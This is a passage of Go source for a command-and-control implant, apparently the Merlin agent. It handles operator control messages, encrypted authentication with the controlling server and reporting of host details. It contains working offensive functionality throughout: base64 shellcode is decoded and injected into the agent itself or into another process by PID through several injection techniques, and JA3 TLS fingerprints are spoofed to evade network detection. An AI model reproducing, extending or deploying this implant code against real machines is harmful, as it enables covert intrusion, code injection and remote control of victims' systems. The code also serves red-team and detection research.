		results.Stderr = fmt.Sprintf("%s is not a valid module type", cmd.Command)
	}

	if a.Verbose {
		if results.Stderr == "" {
			message("success", results.Stdout)

		} else {
			message("warn", results.Stderr)
		}
	}

	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.RESULT,
		Payload: results,
	}
}

// agentControl makes configuration changes to the agent
func (a *Agent) agentControl(job jobs.Job) {
	cmd := job.Payload.(jobs.Command)
	if a.Verbose {
		message("note", fmt.Sprintf("Received Agent Control Message: %s", cmd.Command))
	}
	var results jobs.Results

	switch cmd.Command {
	case "kill":
		os.Exit(0)
	case "sleep":
		if a.Verbose {
			message("note", fmt.Sprintf("Setting agent sleep time to %s", cmd.Args))
		}
		t, err := time.ParseDuration(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent waitTime:\r\n%s", err.Error())
			break
		}
		if t >= 0 {
			a.WaitTime = t
		} else {
			results.Stderr = fmt.Sprintf("the agent was provided with a time that was not greater than or equal to zero:\r\n%s", t.String())
			break
		}
	case "skew":
		t, err := strconv.ParseInt(cmd.Args[0], 10, 64)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent skew interval:\r\n%s", err.Error())
			break
		}
		if a.Verbose {
			message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
		}
		a.Skew = t
	case "padding":
		t, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing the agent message padding size:\r\n%s", err.Error())
			break
		}
		if a.Verbose {
			message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
		}
		a.PaddingMax = t
	case "initialize":
		if a.Verbose {
			message("note", "Received agent re-initialize message")
		}
		a.initial = false
	case "maxretry":
		t, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("There was an error changing the agent max retries:\r\n%s", err.Error())
			break
		}
		if a.Verbose {
			message("note", fmt.Sprintf("Setting agent max retries to %d", t))
		}
		a.MaxRetry = t
	case "killdate":
		d, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error converting the kill date to an integer:\r\n%s", err.Error())
			break
		}
		a.KillDate = int64(d)
		if a.Verbose {
			message("info", fmt.Sprintf("Set Kill Date to: %s",
				time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
		}
	case "ja3":
		a.JA3 = strings.Trim(cmd.Args[0], "\"'")

		//Update the client
		var err error

		a.Client, err = getClient(a.Proto, "", a.JA3)

		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error setting the agent client:\r\n%s", err.Error())
		}

		if a.Verbose && a.JA3 != "" {
			message("note", fmt.Sprintf("Set agent JA3 signature to:%s", a.JA3))
		} else if a.Verbose && a.JA3 == "" {
			message("note", fmt.Sprintf("Setting agent client back to default using %s protocol", a.Proto))
		}
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", cmd.Command)
	}

	if results.Stderr != "" {
		a.outChan <- jobs.Job{
			ID:      job.ID,
			AgentID: a.ID,
			Token:   job.Token,
			Type:    jobs.RESULT,
			Payload: results,
		}
		return
	}
	if a.Verbose {
		if results.Stderr != "" {
			message("warn", results.Stderr)
		}
		if results.Stdout != "" {
			message("success", results.Stdout)

		}
	}

	a.getAgentInfoMessage(job)
}

// executeShellcode instructs the agent to load and run shellcode according to the input job
func (a *Agent) executeShellcode(job jobs.Job) {
	cmd := job.Payload.(jobs.Shellcode)
	var results jobs.Results
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for executeShellcode function: %+v", job))
	}

	shellcodeBytes, errDecode := base64.StdEncoding.DecodeString(cmd.Bytes)

	if errDecode != nil {
		results.Stderr = fmt.Sprintf("there was an error decoding the shellcode Base64 string:\r\n%s", errDecode)
		if a.Verbose {
			message("warn", results.Stderr)
		}
		a.outChan <- jobs.Job{
			ID:      job.ID,
			AgentID: a.ID,
			Token:   job.Token,
			Type:    jobs.RESULT,
			Payload: results,
		}
		return
	}

	if a.Verbose {
		message("info", fmt.Sprintf("Shelcode execution method: %s", cmd.Method))
	}
	if a.Debug {
		message("info", fmt.Sprintf("Executing shellcode %s", shellcodeBytes))
	}

	switch cmd.Method {
	case "self":
		err := ExecuteShellcodeSelf(shellcodeBytes)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"self\" method:\r\n%s", err)
		}
	case "remote":
		err := ExecuteShellcodeRemote(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"remote\" method:\r\n%s", err)
		}
	case "rtlcreateuserthread":
		err := ExecuteShellcodeRtlCreateUserThread(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"rtlcreateuserthread\" method:\r\n%s", err)
		}
	case "userapc":
		err := ExecuteShellcodeQueueUserAPC(shellcodeBytes, cmd.PID)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing shellcode with the \"userapc\" method:\r\n%s", err)
		}
	default:
		results.Stderr = fmt.Sprintf("invalid shellcode execution method: %s", cmd.Method)
	}
	if results.Stderr == "" {
		results.Stdout = fmt.Sprintf("Shellcode %s method successfully executed", cmd.Method)
	}
	if a.Verbose {
		if results.Stderr == "" {
			message("success", results.Stdout)
		} else {
			message("warn", results.Stderr)
		}
	}
	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.RESULT,
		Payload: results,
	}
}

// list gets and returns a list of files and directories from the input file path
func (a *Agent) list(path string) (string, error) {
	if a.Debug {
		message("debug", fmt.Sprintf("Received input parameter for list command function: %s", path))

	} else if a.Verbose {
		message("success", fmt.Sprintf("listing directory contents for: %s", path))
	}

	// Resolve relative path to absolute
	aPath, errPath := filepath.Abs(path)
	if errPath != nil {
		return "", errPath
	}
	files, err := ioutil.ReadDir(aPath)

	if err != nil {
		return "", err
	}

	details := fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, f := range files {
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return details, nil
}

//opaqueRegister is used to perform the OPAQUE Password Authenticated Key Exchange (PAKE) protocol Registration
func (a *Agent) opaqueRegister() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Registration")
	}

	// Build OPAQUE User Registration Initialization
	userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
	userRegInit := userReg.Init(a.pwdU)

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE UserID: %x", userRegInit.UserID))
		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
		message("debug", fmt.Sprintf("OPAQUE PwdU: %x", a.pwdU))
	}

	userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
	if errUserRegInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
	}

	// Message to be sent to the server
	regInit := opaque.Opaque{
		Type:    opaque.RegInit,
		Payload: userRegInitBytes,
	}
	regInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    messages.OPAQUE,
		Payload: regInit,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE registration:\r\n%s", errJWT)
	}
	a.JWT = agentJWT

	regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)

	if errRegInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
	}

	if regInitResp.Type != messages.OPAQUE {
		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(regInitResp.Type))
	}
	if regInitResp.Payload.(opaque.Opaque).Type != opaque.RegInit {
		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.RegInit, regInitResp.Payload.(opaque.Opaque).Type)
	}

	var serverRegInit gopaque.ServerRegisterInit

	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.(opaque.Opaque).Payload)
	if errServerRegInit != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
	}

	if a.Verbose {
		message("note", "Received OPAQUE server registration initialization message")
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
	}

	// TODO extend gopaque to run RwdU through n iterations of PBKDF2
	userRegComplete := userReg.Complete(&serverRegInit)

	userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
	if errUserRegCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", userRegComplete.EnvU))
		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
	}

	// message to be sent to the server
	regComplete := opaque.Opaque{
		Type:    opaque.RegComplete,
		Payload: userRegCompleteBytes,
	}
	regCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    messages.OPAQUE,
		Payload: regComplete,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)

	if errRegCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
	}

	if regCompleteResp.Type != messages.OPAQUE {
		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(regInitResp.Type))
	}
	if regCompleteResp.Payload.(opaque.Opaque).Type != opaque.RegComplete {
		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.RegComplete, regInitResp.Payload.(opaque.Opaque).Type)
	}

	if a.Verbose {
		message("note", "OPAQUE registration complete")
	}

	return nil
}

// opaqueAuthenticate is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
func (a *Agent) opaqueAuthenticate() error {

	if a.Verbose {
		message("note", "Starting OPAQUE Authentication")
	}

	// 1 - Create a NewUserAuth with an embedded key exchange
	userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)

	// 2 - Call Init with the password and send the resulting UserAuthInit to the server
	userAuthInit, err := userAuth.Init(a.pwdU)
	if err != nil {
		return fmt.Errorf("there was an error creating the OPAQUE user authentication initialization message:\r\n%s", err.Error())
	}

	userAuthInitBytes, errUserAuthInitBytes := userAuthInit.ToBytes()
	if errUserAuthInitBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication initialization message to bytes:\r\n%s", errUserAuthInitBytes.Error())
	}

	// message to be sent to the server
	authInit := opaque.Opaque{
		Type:    opaque.AuthInit,
		Payload: userAuthInitBytes,
	}
	authInitBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    messages.OPAQUE,
		Payload: authInit,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(a.psk))
	a.secret = k[:]

	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
	agentJWT, errJWT := a.getJWT()
	if errJWT != nil {
		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
	}
	a.JWT = agentJWT

	authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)

	if errAuthInitResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication initialization message:\r\n%s", errAuthInitResp.Error())
	}

	if authInitResp.Type != messages.OPAQUE {
		return fmt.Errorf("expected OPAQUE message, recieved %s", messages.String(authInitResp.Type))
	}

	// When the Merlin server has restarted but doesn't know the agent
	if authInitResp.Payload.(opaque.Opaque).Type == opaque.ReRegister {
		if a.Verbose {
			message("note", "Received OPAQUE ReRegister response, setting initial to false")
		}
		a.initial = false
		return nil
	}

	if authInitResp.Payload.(opaque.Opaque).Type != opaque.AuthInit {
		return fmt.Errorf("expected OPAQUE message type: %d, recieved: %d", opaque.AuthInit, authInitResp.Payload.(opaque.Opaque).Type)
	}

	// 3 - Receive the server's ServerAuthComplete
	var serverComplete gopaque.ServerAuthComplete

	errServerComplete := serverComplete.FromBytes(gopaque.CryptoDefault, authInitResp.Payload.(opaque.Opaque).Payload)
	if errServerComplete != nil {
		return fmt.Errorf("there was an error unmarshalling the OPAQUE server complete message from bytes:\r\n%s", errServerComplete.Error())
	}

	// 4 - Call Complete with the server's ServerAuthComplete. The resulting UserAuthFinish has user and server key
	// information. This would be the last step if we were not using an embedded key exchange. Since we are, take the
	// resulting UserAuthComplete and send it to the server.
	if a.Verbose {
		message("note", "Received OPAQUE server complete message")
	}

	if a.Debug {
		message("debug", fmt.Sprintf("OPAQUE Beta: %x", serverComplete.Beta))
		message("debug", fmt.Sprintf("OPAQUE V: %x", serverComplete.V))
		message("debug", fmt.Sprintf("OPAQUE PubS: %x", serverComplete.ServerPublicKey))
		message("debug", fmt.Sprintf("OPAQUE EnvU: %x", serverComplete.EnvU))
	}

	_, userAuthComplete, errUserAuth := userAuth.Complete(&serverComplete)
	if errUserAuth != nil {
		return fmt.Errorf("there was an error completing OPAQUE authentication:\r\n%s", errUserAuth)
	}

	userAuthCompleteBytes, errUserAuthCompleteBytes := userAuthComplete.ToBytes()
	if errUserAuthCompleteBytes != nil {
		return fmt.Errorf("there was an error marshalling the OPAQUE user authentication complete message to bytes:\r\n%s", errUserAuthCompleteBytes.Error())
	}

	authComplete := opaque.Opaque{
		Type:    opaque.AuthComplete,
		Payload: userAuthCompleteBytes,
	}
	authCompleteBase := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    messages.OPAQUE,
		Payload: authComplete,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Save the OPAQUE derived Diffie-Hellman secret
	a.secret = []byte(userKex.SharedSecret.String())

	// Send the User Auth Complete message
	authCompleteResp, errAuthCompleteResp := a.sendMessage("POST", authCompleteBase)

	if errAuthCompleteResp != nil {
		return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
	}

	if authCompleteResp.Token != "" {
		a.JWT = authCompleteResp.Token
	}

	switch authCompleteResp.Type {
	case messages.JOBS:
		if a.Verbose {
			message("success", "Agent authentication successful")
		}
		a.messageHandler(authCompleteResp)
		if a.Debug {
			message("debug", "Leaving agent.opaqueAuthenticate without error")
		}
		return nil
	default:
		return fmt.Errorf("received unexpected or unrecognized message type during OPAQUE authentication completion:\r\n%s", messages.String(authCompleteResp.Type))
	}
}

// rsaKeyExchange is use to create and exchange RSA keys with the server
func (a *Agent) rsaKeyExchange() error {
	if a.Debug {
		message("debug", "Entering into rsaKeyExchange function")
	}

	pk := messages.KeyExchange{
		PublicKey: a.RSAKeys.PublicKey,
	}

	m := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    messages.KEYEXCHANGE,
		Payload: pk,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	// Send KeyExchange to server
	resp, reqErr := a.sendMessage("POST", m)

	if reqErr != nil {
		return fmt.Errorf("there was an error sending the key exchange message:\r\n%s", reqErr.Error())
	}

	// Handle KeyExchange response from server
	a.messageHandler(resp)

	if a.Debug {
		message("debug", "Leaving rsaKeyExchange function without error")
	}
	return nil
}

// getJWT is used to send an unauthenticated JWT on the first message to the server
func (a *Agent) getJWT() (string, error) {
	// Create encrypter
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // Doesn't create a per message key
			Key:       a.secret},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
	}

	// Create signer
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       a.secret},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// Build JWT claims
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
		ID:       a.ID.String(),
	}

	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// Parse it to check for errors
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}

	return agentJWT, nil
}

// getAgentInfoMessage is used to place of the information about an agent and it's configuration into a message and return it
func (a *Agent) getAgentInfoMessage(job jobs.Job) {
	sysInfoMessage := messages.SysInfo{
		Platform:     a.Platform,
		Architecture: a.Architecture,
		UserName:     a.UserName,
		UserGUID:     a.UserGUID,
		HostName:     a.HostName,
		Pid:          a.Pid,
		Ips:          a.Ips,
	}

	agentInfoMessage := messages.AgentInfo{
		Version:       merlin.Version,
		Build:         build,
		WaitTime:      a.WaitTime.String(),
		PaddingMax:    a.PaddingMax,
		MaxRetry:      a.MaxRetry,
		FailedCheckin: a.FailedCheckin,
		Skew:          a.Skew,
		Proto:         a.Proto,
		SysInfo:       sysInfoMessage,
		KillDate:      a.KillDate,
		JA3:           a.JA3,
	}

	a.outChan <- jobs.Job{
		ID:      job.ID,
		AgentID: a.ID,
		Token:   job.Token,
		Type:    jobs.AGENTINFO,
		Payload: agentInfoMessage,
	}
}

// TODO centralize this into a package because it is used here and in the server
// message is used to print a message to the command line
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO add cert stapling
// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO configure set UserAgent agentcontrol message
